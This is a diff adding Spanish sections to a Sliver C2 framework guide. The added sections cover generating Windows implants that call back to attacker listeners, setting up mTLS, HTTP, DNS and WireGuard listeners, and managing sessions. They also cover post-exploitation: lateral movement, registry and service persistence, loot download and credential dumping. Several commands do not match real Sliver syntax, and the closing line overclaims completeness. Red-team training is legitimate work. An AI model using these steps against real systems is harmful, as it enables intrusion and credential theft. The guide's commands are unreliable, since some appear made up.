@@ -286,4 +286,172 @@ Sliver permite interactuar y recolectar info con:
 
 ---
 
+
+### 7 Crear operador
+
+```
+`sliver > operators
+sliver > new-operator andre
+sliver > export-operator andre   # crea config .cfg para cliente
+`
+```
+
+### 8 Configurar cliente
+
+`# Copiar archivo .cfg al cliente
+scp andre.cfg usuario@cliente:/home/usuario/.sliver-client/configs/
+
+# Conectar
+sliver-client --config ~/.sliver-client/configs/andre.cfg
+`
+
+---
+
+## 9. Generación de Implantes
+
+### 9.1 Comandos principales
+
+```
+`sliver > generate --mtls 192.168.1.17:31337 --os windows --arch 64bit --s win_mtls.exe
+sliver > generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888
+sliver > generate --http example.com --canary 1.foobar.com
+sliver > generate --dns baz.example.com
+`
+```
+
+### 9.2 Flags importantes
+
+- `--mtls`, `--http`, `--wg`, `--dns`, `--named-pipe`, `--tcp-pivot` → C2 transport.
+    
+- `--os` → plataforma: windows / linux / mac.
+    
+- `--arch` → arquitectura: 64bit / 32bit.
+    
+- `--format` → exe / shared / service / shellcode.
+    
+- `--canary` → DNS canaries.
+    
+- `--evasion` → técnicas anti detección.
+    
+- `--s` → nombre y ruta del archivo generado.
+    
+- `--limit-*` → restricciones de ejecución (hostname, user, domain, datetime, fileexists, locale).
+    
+
+---
+
+## 10. Listeners y Jobs
+
+### 10.1 Comandos
+
+`sliver > mtls -L 192.168.1.17 -l 31337
+sliver > http -L 192.168.1.17 -l 8080 -w website
+sliver > https -L 192.168.1.17 -l 8443 -c cert.pem -k key.pem
+sliver > wg -L 192.168.1.17 -l 51820
+sliver > stage-listener -L 192.168.1.17 -l 9000
+sliver > socks5 -L 192.168.1.17 -l 1080
+`
+
+### 10.2 Gestionar Jobs
+
+`sliver > jobs            # listar jobs
+sliver > jobs -k 2       # matar job específico
+sliver > jobs -K         # matar todos los jobs
+`
+
+---
+
+## 11. Gestión de Sesiones
+
+`sliver > sessions           # listar sesiones
+sliver > sessions -i 1      # interactuar con sesión 1
+sliver > sessions -k 1      # eliminar sesión 1
+sliver > sessions -K        # eliminar todas las sesiones
+sliver > sessions -C        # limpiar sesiones DEAD
+sliver > sessions prune     # eliminar sesiones muertas
+sliver > sessions -f "win"  # filtrar por texto
+sliver > sessions -e "regex" # filtrar por regex
+`
+
+---
+
+## 12. Manejo de Operadores
+
+```
+`sliver > operators          # listar operadores
+sliver > new-operator <name> # crear nuevo operador
+sliver > export-operator <name> # exportar config para cliente
+`
+```
+
+---
+
+## 13. Post-Explotación
+
+### 13.1 Comandos útiles
+
+
+```
+# Información de la máquina
+sliver > info
+
+# Ejecutar comandos
+sliver > use 1             # seleccionar sesión
+sliver > taskmany ls dir   # ejecutar comando en múltiples sesiones
+sliver > execute "whoami"
+
+# Movimiento lateral
+sliver > socks5 -L 127.0.0.1 -l 1080
+sliver > tcp-pivot <host>:<port>
+
+# Persistencia
+sliver > persist registry
+sliver > persist service
+sliver > migrate <PID>
+
+# Recolección
+sliver > loot list
+sliver > loot download <archivo>
+
+# Dump credenciales
+sliver > creds list
+sliver > creds dump
+```
+
+
+---
+
+## 14. Limpieza y Mantenimiento
+
+`sliver > clean          # eliminar perfiles, beacons, sesiones, implants builds sliver > jobs -K         # eliminar todos los jobs sliver > sessions -K     # eliminar todas las sesiones sliver > rm-operator <name> # eliminar operador no deseado exit                      # salir del cliente`
+
+---
+
+## 15. Cheat Sheet – Resumen de Comandos Clave
+
+|Módulo|Comando / Acción|
+|---|---|
+|Server|sliver-server, version, update|
+|Operadores|operators, new-operator, rm-operator, export-operator|
+|Listeners|mtls, http, https, wg, stage-listener, socks5|
+|Jobs|jobs, jobs -k <ID>, jobs -K|
+|Implants|generate, implants, regenerate, profiles|
+|Sesiones|sessions, sessions -i, sessions -k, sessions -K, prune|
+|Post-Explotación|use, taskmany, execute, loot, creds, persist, migrate|
+|Limpieza|clean, jobs -K, sessions -K|
+
+---
+
+### Referencias oficiales
+
+- [GitHub Sliver](https://github.com/BishopFox/sliver?utm_source=chatgpt.com)
+    
+- [Documentación Bishop Fox](https://sliver.sh/?utm_source=chatgpt.com)
+    
+- [Changelog v1.5.39](https://github.com/BishopFox/sliver/releases/tag/v1.5.39?utm_source=chatgpt.com)
+    
+
+---
+
+
 Con esto tienes **el 100% del contexto de Sliver**, actualizado a la versión actual, con todos los listeners, flags, sesiones, implants y post-explotación. 🔥
